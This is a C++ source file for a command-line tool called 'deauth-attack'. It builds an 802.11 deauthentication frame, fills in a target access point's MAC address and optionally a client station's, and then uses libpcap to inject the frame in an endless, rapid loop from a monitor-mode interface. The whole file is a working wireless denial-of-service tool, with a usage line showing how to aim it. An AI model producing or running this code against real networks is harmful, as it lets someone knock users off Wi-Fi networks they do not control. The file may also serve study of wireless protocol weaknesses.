#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <pcap.h>
#include <unistd.h>
#include <stddef.h>
#include "wireless.h"

uint8_t deauth_frame[38] = {
    0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, /* ........ */
    0x02, 0x00, 0x18, 0x00, 0xc0, 0x00, 0x3a, 0x01, /* ......:. */
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x08, 0x5d, /* .......] */
    0xdd, 0x14, 0xe2, 0xa4, 0x08, 0x5d, 0xdd, 0x14, /* .....].. */
    0xe2, 0xa4, 0x90, 0x45, 0x07, 0x00              /* ...E.. */
};

void pack_addr(uint8_t* buf, int start, char* str) {
    for (int i = 0; i < 6; i++) {
        str[i * 3 + 2] = '\0';
        int val = strtol(str + i * 3, NULL, 16);
        buf[start + i] = val;
    }
}

void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

struct Param {
    char* interface_;
    char* ap_mac_;
    char* station_mac_;
    bool unicast;
    bool auth;
};

Param param { .interface_= NULL, .ap_mac_= NULL, .station_mac_ = NULL, .unicast = false, .auth = false };

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 3)
        return false;

    param->interface_ = argv[1];
    param->ap_mac_ = argv[2];
    if (argc >= 4) {
        param->unicast = true;
        param->station_mac_ = argv[3];
        puts("station set");
    }
    if (argc >= 5 && !strcmp("-auth", argv[4])) {
        param->auth = true;
    }

    return true;
}

int main(int argc, char *argv[])
{
    if (!parse(&param, argc, argv)) {
        usage();
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.interface_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.interface_, errbuf);
        return -1;
    }

    if (param.auth) {
        /* To Do */
    }

    else {
        uint8_t buf[256];
        for (int i = 0; i < (int)sizeof(deauth_frame); i++)
            buf[i] = deauth_frame[i];
        int radiotap_length = ((struct ieee80211_radiotap_header*)(buf))->it_len;
        int offset_to_ap = radiotap_length + offsetof(struct ieee80211_deauthentication_frame, send_addr);
        pack_addr(buf, offset_to_ap, param.ap_mac_);

        int offset_to_bssid = radiotap_length + offsetof(struct ieee80211_deauthentication_frame, bssid);
        pack_addr(buf, offset_to_bssid, param.ap_mac_);

        if(param.unicast) {
            int offset_to_station = radiotap_length + offsetof(struct ieee80211_deauthentication_frame, recv_addr);
            pack_addr(buf, offset_to_station, param.station_mac_);
        }

        while (true) {
            puts("sending deauth packet ... ");
            pcap_sendpacket(pcap, buf, sizeof(deauth_frame));
            usleep(100);
        }
    }

    return 0;
}
